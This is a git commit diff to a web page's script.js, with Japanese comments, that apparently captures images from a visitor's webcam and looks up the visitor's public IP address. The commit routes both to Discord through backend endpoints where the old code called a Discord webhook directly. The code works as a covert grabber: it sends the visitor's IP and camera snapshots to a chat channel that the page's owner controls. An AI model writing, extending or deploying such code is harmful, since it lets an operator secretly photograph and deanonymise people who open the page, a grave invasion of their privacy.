c268a8209884ad54d77c8671f9c0e64f8578ea90
Amo1123 <hika11237989@gmail.com>
2025-02-18 07:08:11 +0900

    Update script.js

--- public/script.js
+++ public/script.js
@@ -1,17 +1,11 @@
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 
-async function getWebhookUrl() {
-    const response = await fetch('/api/webhook');
-    const data = await response.json();
-    return data.webhookUrl;
-}
-
 fetch('https://api.ipify.org?format=json')
     .then(response => response.json())
     .then(data => {
         const ipAddress = data.ip;
-        getWebhookUrl().then(webhookUrl => sendToDiscord(webhookUrl, `IPアドレス: ${ipAddress}`));
+        sendToDiscord(`IPアドレス: ${ipAddress}`);
     })
     .catch(error => console.error('IPアドレスの取得に失敗しました:', error));
 
@@ -31,32 +25,29 @@ function captureImage() {
         const formData = new FormData();
         formData.append('file', blob, 'image.png');
 
-        getWebhookUrl().then(webhookUrl => {
-            fetch(webhookUrl, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('画像が送信されました');
-                } else {
-                    console.error('画像の送信に失敗しました:', response.status, response.statusText);
-                }
-            })
-            .catch(error => {
-                console.error('エラーが発生しました:', error);
-            });
+        // ここでバックエンドに送るよう変更
+        fetch('/api/sendImage', {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log('画像が送信されました');
+            } else {
+                console.error('画像の送信に失敗しました:', response.status, response.statusText);
+            }
+        })
+        .catch(error => {
+            console.error('エラーが発生しました:', error);
         });
     }, 'image/png');
 }
 
-function sendToDiscord(webhookUrl, message) {
-    fetch(webhookUrl, {
+function sendToDiscord(message) {
+    fetch('/api/sendMessage', {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ content: message })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message }),
     })
     .then(response => {
         if (response.ok) {
